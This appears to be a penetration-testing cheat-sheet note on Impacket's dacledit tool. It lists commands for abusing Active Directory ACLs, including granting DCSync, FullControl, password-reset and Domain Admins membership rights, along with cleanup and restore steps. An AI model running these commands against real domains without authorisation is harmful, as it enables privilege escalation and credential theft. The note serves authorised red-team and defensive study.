# dacledit

**Tags:** `#dacledit` `#impacket` `#dacl` `#acl` `#activedirectory` `#privesc`

Impacket script (`impacket-dacledit`) for reading and writing Active Directory object DACLs from Linux — the precise counterpart to PowerView's `Add-DomainObjectAcl`/`Get-DomainObjectAcl`. Given a right over a target object (or after a `WriteDacl` edge), it adds an ACE granting a chosen principal a chosen right (e.g. `FullControl`, or specific rights like DS-Replication for DCSync), enabling ACL-edge escalation without touching Windows.

**Source:** Ships with Impacket (https://github.com/fortra/impacket). **Install:** `pipx install impacket` (Kali: pre-installed as `impacket-dacledit`).

**Actions (`-action`):** `read` (default) · `write` · `remove` · `backup` · `restore`.
**Rights (`-rights`):** `FullControl` (default) · `ResetPassword` · `WriteMembers` · `DCSync` · `Custom` (with `-rights-guid <GUID>` for one specific extended right). Identify principal/target by name, or precisely with `-principal-sid`/`-target-sid`/`-principal-dn`/`-target-dn`.

```bash
# Read the DACL on a target — who has what over it
impacket-dacledit -action read -target <victim> '<domain>/<user>:<pass>'
# Filter to a single principal's rights over the target
impacket-dacledit -action read -principal <user> -target <victim> '<domain>/<user>:<pass>'

# --- The escalation writes (each needs WriteDacl/GenericAll/WriteOwner→owner on the target) ---

# Grant FullControl over a user/computer/group
impacket-dacledit -action write -rights FullControl -principal <me> -target <victim> '<domain>/<user>:<pass>'

# Grant DCSync on the DOMAIN object (target = domain) → then secretsdump -just-dc
impacket-dacledit -action write -rights DCSync -principal <me> -target-dn 'DC=corp,DC=local' '<domain>/<user>:<pass>'

# Just the ability to reset the target's password (quieter than FullControl)
impacket-dacledit -action write -rights ResetPassword -principal <me> -target <victim> '<domain>/<user>:<pass>'

# Grant add/remove-members on a group (WriteMembers) → add yourself later
impacket-dacledit -action write -rights WriteMembers -principal <me> -target 'Domain Admins' '<domain>/<user>:<pass>'

# One specific extended right by GUID (-rights Custom -rights-guid)
impacket-dacledit -action write -rights Custom -rights-guid 00299570-246d-11d0-a768-00aa006e0529 \
  -principal <me> -target <victim> '<domain>/<user>:<pass>'   # (that GUID = User-Force-Change-Password)
```

> [!tip] **Cleanup — the half most writeups skip.** dacledit **auto-writes a `.bak` of the original DACL before every `write`/`remove`**, so you always have a restore point (note the filename it prints). You can also snapshot on demand:
> ```bash
> impacket-dacledit -action backup -target <victim> '<domain>/<user>:<pass>'   # → dacledit-<YYYYMMDD-HHMMSS>.bak
> # ...do the attack, then put the original ACL back:
> impacket-dacledit -action restore -target <victim> -file dacledit-<YYYYMMDD-HHMMSS>.bak '<domain>/<user>:<pass>'
> # (or surgically drop just the ACE you added)
> impacket-dacledit -action remove -rights FullControl -principal <me> -target <victim> '<domain>/<user>:<pass>'
> ```
> Auth also accepts `-hashes LM:NT`, `-k` (Kerberos ccache), `-aesKey`, and `-use-ldaps`.

---

> [!note] **See also** — [[Services/Active Directory/ACL Abuse|ACL Abuse]] — precise DACL read/write for `WriteDacl`→FullControl/DCSync escalation from Linux.

---

*Created: 2026-09-25*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
